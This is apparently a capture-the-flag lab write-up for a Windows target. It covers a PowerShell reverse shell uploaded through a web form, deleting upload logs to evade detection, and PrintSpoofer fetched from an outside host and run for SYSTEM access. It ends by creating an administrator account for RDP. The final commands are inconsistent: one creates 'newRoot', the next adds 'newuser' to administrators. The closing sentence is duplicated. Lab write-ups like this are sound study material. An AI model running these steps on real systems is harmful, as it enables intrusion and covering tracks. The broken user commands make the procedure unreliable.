Webpage Exploration: Skipped the nmap scan and directly explored port 8080, encountering a webpage with file upload functionality.

Reverse Shell Setup: Established a Netcat listener on port 9001 and crafted a PowerShell reverse shell payload for upload.

PowerShell Reverse Shell Code:

powershell code: 
$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); ...
This script successfully granted low-level shell access upon upload and execution.

Discovering Sensitive Information
Finding Encoded Message: Located a base64 encoded message in C:\Users\evader\Desktop.
Decoding the Message: Revealed a URL: http://10.10.34.210:8000/asdasdadasdjakjdnsdfsdfs.php.
Evading Blue Team Detection
Deleting File Upload Logs: To access the newly found page, I had to delete file upload logs at C:\xampp\htdocs\uploads.
Retrieving the First Flag: Successfully accessed the page and retrieved the flag: THM{****************}.
Manual Windows Privilege Escalation
Exploring System Information: Ran systeminfo to gather system details. Notably, the system had no hotfixes, indicating potential vulnerabilities.
Privilege Escalation via PrintSpoofer
Context Understanding: Noted that the SeImpersonatePrivilege was enabled(Use p0wny-shell to gain a shell on xampp service )

Leveraging PrintSpoofer: Used the PrintSpoofer technique, exploiting the Windows print spooler service.

PrintSpoofer Execution:

Download: Used Invoke-WebRequest to download the PrintSpoofer binary.
cmd
Copy code
iwr -uri "http://10.11.50.160/PrintSpoofer.exe" -o PrintSpoofer.exe
Run Command: Executed PrintSpoofer to gain a SYSTEM shell.
cmd
Copy code
.\PrintSpoofer.exe -i -c cmd
Privilege Escalation: Performed actions that required elevated privileges, including creating a new administrative user.
Final Steps
Creating Administrative User:
cmd
Copy code
net user newRoot password /add
net localgroup administrators newuser /add

You will now be able to rdp in, or use the newRoot user to read the flag in the administrator folder. 

You now have the capability to remotely access the system via RDP, or alternatively, you can utilize the newly created newRoot user account to access and read the flag located in the Administrator's folder.
